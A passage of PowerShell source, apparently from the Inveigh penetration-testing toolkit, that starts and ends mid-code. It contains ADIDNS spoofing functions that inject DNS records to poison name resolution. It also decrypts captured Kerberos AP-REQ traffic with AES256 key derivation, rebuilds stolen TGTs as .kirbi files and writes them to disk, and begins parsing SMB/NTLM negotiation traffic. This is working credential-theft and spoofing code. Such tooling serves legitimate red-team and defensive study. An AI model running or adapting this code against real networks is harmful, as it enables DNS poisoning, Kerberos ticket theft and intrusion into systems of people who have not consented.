-Credential $Credential -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -Zone $Zone\n\n                if($node_tombstoned)\n                {\n                    Enable-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone\n                }\n\n            }\n\n        }\n        catch\n        {\n            $error_message = $_.Exception.Message\n            $error_message = $error_message -replace \"`n\",\"\"\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] ADIDNS spoofer disabled due to error\") > $null\n            $inveigh.ADIDNS = $null\n        }\n\n    }\n\n    function Invoke-ADIDNSCheck\n    {\n        [CmdletBinding()]\n        param\n        (\n            [parameter(Mandatory=$false)][Array]$Ignore,\n            [parameter(Mandatory=$false)][String]$Data,\n            [parameter(Mandatory=$false)][String]$Domain,\n            [parameter(Mandatory=$false)][String]$DomainController,\n            [parameter(Mandatory=$false)][String]$Forest,\n            [parameter(Mandatory=$false)]$Partition,\n            [parameter(Mandatory=$false)][String]$Zone,\n            [parameter(Mandatory=$false)][Int]$Threshold,\n            [parameter(Mandatory=$false)][Int]$TTL,\n            [parameter(Mandatory=$false)]$RequestTable,\n            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential\n        )\n\n        Start-Sleep -S 1\n\n        foreach($request in $RequestTable.Keys)\n        {\n\n            if(($RequestTable.$request | Sort-Object -Unique).Count -gt $Threshold)\n            {\n\n                if(!$inveigh.ADIDNS_table.ContainsKey($request))\n                {\n                    $inveigh.ADIDNS_table.Add($request,\"\")\n                }\n                \n                if($Ignore -NotContains $request -and !$inveigh.ADIDNS_table.$request)\n                {    \n                    Invoke-ADIDNSSpoofer -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $request -Partition $Partition -Type 'A' -TTL $TTL -Zone $Zone\n                }\n                elseif($Ignore -Contains $request)\n                {\n\n                    if(!$inveigh.ADIDNS_table.$request)\n                    {\n                        $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] ADIDNS combo attack ignored $request\") > $null\n                        $inveigh.ADIDNS_table.$request = 3\n                    }\n\n                }\n\n            }\n            \n            Start-Sleep -m 10\n        }\n\n    }\n\n}\n\n# Kerberos Functions ScriptBlock\n$kerberos_functions_scriptblock = \n{\n\n    function Get-KerberosAES256BaseKey\n    {\n        param([String]$salt,[System.Security.SecureString]$password)\n\n        $password_BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)\n        $password_cleartext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($password_BSTR)\n        [Byte[]]$salt = [System.Text.Encoding]::UTF8.GetBytes($salt)\n        [Byte[]]$password_cleartext = [System.Text.Encoding]::UTF8.GetBytes($password_cleartext)\n        $constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4\n        $PBKDF2 = New-Object Security.Cryptography.Rfc2898DeriveBytes($password_cleartext,$salt,4096)\n        Remove-Variable password_cleartext\n        $PBKDF2_key = $PBKDF2.GetBytes(32)\n        $AES = New-Object \"System.Security.Cryptography.AesManaged\"\n        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $AES.Padding = [System.Security.Cryptography.PaddingMode]::None\n        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00\n        $AES.KeySize = 256\n        $AES.Key = $PBKDF2_key\n        $AES_encryptor = $AES.CreateEncryptor()\n        $base_key_part_1 = $AES_encryptor.TransformFinalBlock($constant,0,$constant.Length)\n        $base_key_part_2 = $AES_encryptor.TransformFinalBlock($base_key_part_1,0,$base_key_part_1.Length)\n        $base_key = $base_key_part_1[0..15] + $base_key_part_2[0..15]\n\n        return $base_key\n    }\n\n    function Get-KerberosAES256UsageKey\n    {\n        param([String]$key_type,[Int]$usage_number,[Byte[]]$base_key)\n\n        $padding = 0x00 * 16\n\n        if($key_type -eq 'checksum')\n        {\n            switch($usage_number) \n            {\n                25 {[Byte[]]$usage_constant = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $padding}\n            }\n        }\n        elseif($key_type -eq 'encrypt')\n        {\n\n            switch($usage_number) \n            {\n                1 {[Byte[]]$usage_constant = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $padding}\n                2 {[Byte[]]$usage_constant = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $padding}\n                3 {[Byte[]]$usage_constant = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $padding}\n                4 {[Byte[]]$usage_constant = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $padding}\n                7 {[Byte[]]$usage_constant = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + $padding}\n                11 {[Byte[]]$usage_constant = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + $padding}\n                12 {[Byte[]]$usage_constant = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + $padding}\n                14 {[Byte[]]$usage_constant = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + $padding}\n            }\n                \n        }\n        elseif($key_type -eq 'integrity') \n        {\n            \n            switch($usage_number) \n            {\n                1 {[Byte[]]$usage_constant = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + $padding}\n                4 {[Byte[]]$usage_constant = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + $padding}\n                7 {[Byte[]]$usage_constant = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + $padding}\n                11 {[Byte[]]$usage_constant = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + $padding}\n            }\n\n        }\n\n        $AES = New-Object \"System.Security.Cryptography.AesManaged\"\n        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00\n        $AES.KeySize = 256\n        $AES.Key = $base_key\n        $AES_encryptor = $AES.CreateEncryptor()\n        $usage_key = $AES_encryptor.TransformFinalBlock($usage_constant,0,$usage_constant.Length)\n\n        return $usage_key\n    }\n\n    function Get-ASN1Length\n    {\n        param ([Byte[]]$asn1)\n    \n        $i = 0\n    \n        while ($asn1[$i] -ne 3 -and $asn1[$i] -ne 129 -and $asn1[$i] -ne 130 -and $asn1[$i] -ne 131 -and $asn1[$i] -ne 132 -and $i -lt 1)\n        {\n            $i++   \n        }\n    \n        switch ($asn1[$i]) \n        {\n            \n            3\n            { \n                $i += 3 \n                $length = $asn1[$i]\n                $i++\n            }\n    \n            129\n            {\n                $i += 1\n                $length = $asn1[$i]\n                $i++\n            }\n    \n            130\n            {\n                $i += 2\n                $length = Get-UInt16DataLength 0 $asn1[($i)..($i - 1)]\n                $i++\n            }\n    \n            131\n            {\n                $i += 3\n                $length = Get-UInt32DataLength 0 ($asn1[($i)..($i - 2)] + 0x00)\n                $i++\n            }\n    \n            132\n            {\n                $i += 4\n                $length = Get-UInt32DataLength 0 $asn1[($i)..($i - 3)]\n                $i++\n            }\n    \n        }\n    \n        return $i,$length\n    }\n\n    function Unprotect-Kerberos\n    {\n        param([Byte[]]$ke_key,[Byte[]]$encrypted_data)\n\n        $final_block_length = [Math]::Truncate($encrypted_data.Count % 16)\n        [Byte[]]$final_block = $encrypted_data[($encrypted_data.Count - $final_block_length)..$encrypted_data.Count]\n        [Byte[]]$penultimate_block = $encrypted_data[($encrypted_data.Count - $final_block_length - 16)..($encrypted_data.Count - $final_block_length - 1)]\n        $AES = New-Object \"System.Security.Cryptography.AesManaged\"\n        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC\n        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros\n        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00\n        $AES.KeySize = 256\n        $AES.Key = $ke_key\n        $AES_decryptor = $AES.CreateDecryptor()\n        $penultimate_block_cleartext = $AES_decryptor.TransformFinalBlock($penultimate_block,0,$penultimate_block.Length)\n        [Byte[]]$final_block_padding = $penultimate_block_cleartext[$final_block_length..$penultimate_block_cleartext.Count]\n        $final_block += $final_block_padding\n        [Byte[]]$cts_encrypted_data = $encrypted_data[0..($encrypted_data.Count - $final_block_length - 17)] + $final_block + $penultimate_block\n        [Byte[]]$cleartext = $AES_decryptor.TransformFinalBlock($cts_encrypted_data,0,$cts_encrypted_data.Length)\n\n        return $cleartext\n    }\n\n    function Get-Kirbi\n    {\n        param([Byte[]]$kirbi2,[Byte[]]$kirbi3)\n    \n        [Byte[]]$kirbi = $kirbi2 + $kirbi3\n        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n        $kirbi = 0x76,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n    \n        return $kirbi\n    }\n    function Get-KirbiPartTwo\n    {\n        param([Byte[]]$cleartext)\n    \n        $ASN1 = Get-ASN1Length $cleartext[4..9]\n        $ASN1_length = $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + 4)..($ASN1_length + 9)]\n        $ASN1_length += $ASN1[0]\n        $realm_length = $cleartext[($ASN1_length + 7)]\n        $username_length = $cleartext[($ASN1_length + $realm_length + 22)]\n        $field_length = $realm_length + $username_length\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $pvno = $cleartext[($ASN1_length + $field_length + 73)]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]\n        $ASN1_length += $ASN1[0]\n        $tkt_vno = $cleartext[($ASN1_length + $field_length + 73)]\n        $realm2_length = $cleartext[($ASN1_length + $field_length + 75)]\n        [Byte[]]$realm2 = $cleartext[($ASN1_length + $field_length + 76)..($ASN1_length + $field_length + $realm2_length + 75)]\n        $field_length += $realm2_length\n        $sname_string_length = $cleartext[($ASN1_length + $field_length + 88)]\n        [Byte[]]$sname_string = $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + $sname_string_length + 88)]\n        $field_length += $sname_string_length\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]\n        $ASN1_length += $ASN1[0]\n        $kvno = $cleartext[($ASN1_length + $field_length + 88)]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]\n        $ASN1_length += $ASN1[0]\n        $cipher_length = $ASN1[1]\n        [Byte[]]$cipher = $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + $cipher_length + 88)]\n        [Byte[]]$kirbi = 0x04,0x82 + [System.BitConverter]::GetBytes($cipher.Count)[1..0] + $cipher\n        $kirbi = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $kvno + $kirbi\n        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n        $kirbi = 0xA3,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n        [Byte[]]$kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($sname_string.Count)[3..0] + $sname_string\n        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2\n        $kirbi2 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $kirbi2\n        $kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2\n        $kirbi2 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2\n        [Byte[]]$kirbi3 = 0xA1,0x84 + [System.BitConverter]::GetBytes($realm2.Count)[3..0] + $realm2\n        $kirbi3 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $tkt_vno + $kirbi3\n        [Byte[]]$kirbi4 = $kirbi3 + $kirbi2 + $kirbi\n        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0x61,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + $kirbi4\n        $kirbi4 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $pvno + $kirbi4\n    \n        return $kirbi4\n    }\n    \n    function Get-KirbiPartThree\n    {\n        param([Byte[]]$cleartext)\n    \n        $ASN1 = Get-ASN1Length $cleartext[0..($ASN1_length + 5)]\n        $ASN1_length = $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]\n        $ASN1_length += $ASN1[0]\n        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]\n        $ASN1_length += $ASN1[0]\n        [Byte[]]$key = $cleartext[($ASN1_length + 11)..($ASN1_length + 44)]\n        $prerealm_length = $cleartext[($ASN1_length + 46)]\n        [Byte[]]$prerealm = $cleartext[($ASN1_length + 47)..($ASN1_length + $prerealm_length + 46)]\n        $pname_length = $cleartext[($ASN1_length + $prerealm_length + 59)]\n        $field_length = $prerealm_length + $pname_length\n        [Byte[]]$pname = $cleartext[($ASN1_length + $prerealm_length + 60)..($ASN1_length + $field_length + 59)]\n        [Byte[]]$flags = $cleartext[($ASN1_length + $field_length + 65)..($ASN1_length + $field_length + 68)]\n        [Byte[]]$starttime = $cleartext[($ASN1_length + $field_length + 71)..($ASN1_length + $field_length + 87)]\n        [Byte[]]$endtime = $cleartext[($ASN1_length + $field_length + 90)..($ASN1_length + $field_length + 106)]\n        [Byte[]]$renew_till = $cleartext[($ASN1_length + $field_length + 109)..($ASN1_length + $field_length + 125)]\n        $srealm_length = $cleartext[($ASN1_length + $field_length + 127)]\n        [Byte[]]$srealm = $cleartext[($ASN1_length + $field_length + 128)..($ASN1_length + $field_length + $srealm_length + 127)]\n        $field_length += $srealm_length\n        $sname_string_length = $cleartext[($ASN1_length + $field_length + 140)]\n        [Byte[]]$sname_string = $cleartext[($ASN1_length + $field_length + 141)..($ASN1_length + $field_length + $sname_string_length + 140)]\n        [Byte[]]$kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($sname_string.Count)[3..0] + $sname_string\n        $kirbi = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $kirbi\n        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n        $kirbi = 0xA9,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi\n        $kirbi = 0xA8,0x84 + [System.BitConverter]::GetBytes($srealm.Count)[3..0] + $srealm + $kirbi\n        $kirbi = 0xA7,0x84 + [System.BitConverter]::GetBytes($renew_till.Count)[3..0] + $renew_till + $kirbi\n        $kirbi = 0xA6,0x84 + [System.BitConverter]::GetBytes($endtime.Count)[3..0] + $endtime + $kirbi\n        $kirbi = 0xA5,0x84 + [System.BitConverter]::GetBytes($starttime.Count)[3..0] + $starttime + $kirbi\n        $kirbi = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + $flags + $kirbi\n        [Byte[]]$kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($pname.Count)[3..0] + $pname\n        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2\n        $kirbi2 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + $kirbi2\n        $kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2\n        $kirbi2 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2\n        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($prerealm.Count)[3..0] + $prerealm + $kirbi2\n        [Byte[]]$kirbi3 = 0xA1,0x84 + [System.BitConverter]::GetBytes($key.Count)[3..0] + $key\n        $kirbi3 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + $kirbi3\n        $kirbi3 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi3.Count)[3..0] + $kirbi3\n        $kirbi3 = 0xA0,0x84 + [System.BitConverter]::GetBytes($kirbi3.Count)[3..0] + $kirbi3\n        [Byte[]]$kirbi4 = $kirbi3 + $kirbi2 + $kirbi\n        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0xA0,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0x7D,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0x04,0x82 + [System.BitConverter]::GetBytes($kirbi4.Count)[1..0] + $kirbi4\n        $kirbi4 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4\n        $kirbi4 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + $kirbi4\n        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.count)[3..0] + $kirbi4\n        $kirbi4 = 0xA3,0x84 + [System.BitConverter]::GetBytes($kirbi4.count)[3..0] + $kirbi4\n    \n        return $kirbi4\n    }\n\n    function New-KerberosKirbi\n    {\n        param([Byte[]]$data,[Byte[]]$base_key,[String]$service,[String]$service_port,[String]$session)\n\n        $apreq_converted = [System.BitConverter]::ToString($data)\n        $apreq_converted = $apreq_converted -replace \"-\",\"\"\n        $ASN1_index = $apreq_converted.IndexOf(\"A003020112A1030201\")\n\n        if($ASN1_index -ge 0)\n        {\n            $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + 10)..($ASN1_index / 2 + 15)]\n            $ASN1_length = $ASN1[0]\n            $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + 15)]\n            $ASN1_length += $ASN1[0]\n            $cipher_length = $ASN1[1]\n            [Byte[]]$cipher = $data[($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 9)]\n            [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 2 $base_key\n            [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]\n            $cleartext = $cleartext[16..$cleartext.Count]\n            $cleartext_converted = [System.BitConverter]::ToString($cleartext)\n            $cleartext_converted = $cleartext_converted -replace \"-\",\"\"\n            $ASN1_index = $cleartext_converted.IndexOf(\"A003020112A1\")\n\n            if($ASN1_index -ge 0)\n            {\n                [Byte[]]$session_key = $cleartext[30..61]\n                [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 11 $session_key\n                $ASN1_index = $apreq_converted.IndexOf(\"A003020112A2\")\n\n                if($ASN1_index -ge 0)\n                {\n                    $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]\n                    $ASN1_length = $ASN1[0]\n                    $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]\n                    $ASN1_length += $ASN1[0]\n                    $cipher_length = $ASN1[1]\n                    [Byte[]]$cipher = $data[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]\n                    [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]\n                    [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 14 $session_key\n                    $cleartext = $cleartext[16..$cleartext.Count]\n                    [Byte[]]$kirbi2 = Get-KirbiPartTwo $cleartext\n                    $ASN1 = Get-ASN1Length $cleartext[4..9]\n                    $ASN1_length = $ASN1[0]\n                    $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + 4)..($ASN1_length + 9)]\n                    $ASN1_length += $ASN1[0]\n                    $realm_length = $cleartext[($ASN1_length + 7)]\n                    $realm = Convert-DataToString 0 $realm_length $cleartext[($ASN1_length + 8)..($ASN1_length + $realm_length + 7)]\n                    $username_length = $cleartext[($ASN1_length + $realm_length + 22)]\n                    $username = Convert-DataToString 0 $username_length $cleartext[($ASN1_length + $realm_length + 23)..($ASN1_length + $realm_length + $username_length + 22)]\n                    $cleartext_converted = [System.BitConverter]::ToString($cleartext)\n                    $cleartext_converted = $cleartext_converted -replace \"-\",\"\"\n                    $ASN1_index = $cleartext_converted.IndexOf(\"A003020112A2\")\n\n                    if($ASN1_index -ge 0)\n                    {\n                        $ASN1 = Get-ASN1Length $cleartext[($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]\n                        $ASN1_length = $ASN1[0]\n                        $ASN1 = Get-ASN1Length $cleartext[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]\n                        $ASN1_length += $ASN1[0]\n                        $cipher_length = $ASN1[1]\n                        [Byte[]]$cipher = $cleartext[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]\n                        [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]\n                        $cleartext = $cleartext[16..$cleartext.Count]\n                        [Byte[]]$kirbi3 = Get-KirbiPartThree $cleartext\n                        [Byte[]]$kirbi = Get-Kirbi $kirbi2 $kirbi3\n\n                        if($username -notmatch '[^\\x00-\\x7F]+' -and $realm -notmatch '[^\\x00-\\x7F]+')\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $service($service_port) Kerberos TGT captured for $username@$realm from $session\") > $null   \n                            $inveigh.kerberos_TGT_list.Add($kirbi) > $null\n                            $inveigh.kerberos_TGT_username_list.Add(\"$source_IP $username $realm $($inveigh.kerberos_TGT_list.Count - 1)\") > $null\n                            $kirbi_count = ($inveigh.kerberos_TGT_username_list -like \"* $username $realm *\").Count\n                        }\n\n                        if($kirbi_count -le $KerberosCount)\n                        {\n\n                            try\n                            {\n                                $krb_path = $output_directory + \"\\$username@$realm-TGT-$(Get-Date -format MMddhhmmssffff).kirbi\"\n                                $krb_file = New-Object System.IO.FileStream $krb_path,'Append','Write','Read'\n                                $krb_file.Write($kirbi,0,$kirbi.Count)\n                                $krb_file.close()\n                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $service($service_port) Kerberos TGT for $username@$realm written to $krb_path\") > $null\n                            }\n                            catch\n                            {\n                                $error_message = $_.Exception.Message\n                                $error_message = $error_message -replace \"`n\",\"\"\n                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n                            }\n\n                        }\n\n                    }\n                    else\n                    {\n                        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $service($service_port) Kerberos TGT not found from $session\") > $null    \n                    }\n\n                }\n                else\n                {\n                    $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $service($service_port) Kerberos autenticator not found from $sessiont\") > $null    \n                }\n\n            }\n            else\n            {\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to decrypt capture from $session\") > $null    \n            }\n\n        }\n        else\n        {\n            \n            if($apreq_converted -like \"*A0030201??A1030201*\")\n            {\n\n                if($apreq_converted -like \"*A003020111A1030201*\")\n                {\n                    $encryption_type = \"AES128-CTS-HMAC-SHA1-96\"\n                }\n                elseif($apreq_converted -like \"*A003020117A1030201*\")\n                {\n                    $encryption_type = \"RC4-HMAC\"\n                }\n                elseif($apreq_converted -like \"*A003020118A1030201*\")\n                {\n                    $encryption_type = \"RC4-HMAC-EXP\"\n                }\n                elseif($apreq_converted -like \"*A003020103A1030201*\")\n                {\n                    $encryption_type = \"DES-CBC-MD5\"\n                }\n                elseif($apreq_converted -like \"*A003020101A1030201*\")\n                {\n                    $encryption_type = \"DES-CBC-CRC\"\n                }\n\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $service($service_port) Kerberos unsupported encryption type $encryption_type from $session\") > $null\n            }\n            else\n            {\n                $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to extract AS-REQ from $session\") > $null \n            }\n               \n        }\n\n    }\n\n}\n\n# SMB Functions ScriptBlock - function for parsing NTLM challenge/response\n$SMB_functions_scriptblock =\n{\n    \n    function Get-SMBConnection\n    {\n        param ([Byte[]]$Payload,[String]$SnifferIP,[String]$SourceIP,[String]$DestinationIP,[String]$SourcePort,[String]$SMBPort)\n\n        $payload_converted = [System.BitConverter]::ToString($Payload)\n        $payload_converted = $payload_converted -replace \"-\",\"\"\n        $session = \"$SourceIP`:$SourcePort\"\n        $session_outgoing = \"$DestinationIP`:$SMBPort\"\n        $SMB_index = $payload_converted.IndexOf(\"FF534D42\")\n\n        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq \"72\" -and $SourceIP -ne $SnifferIP)\n        {\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session\") > 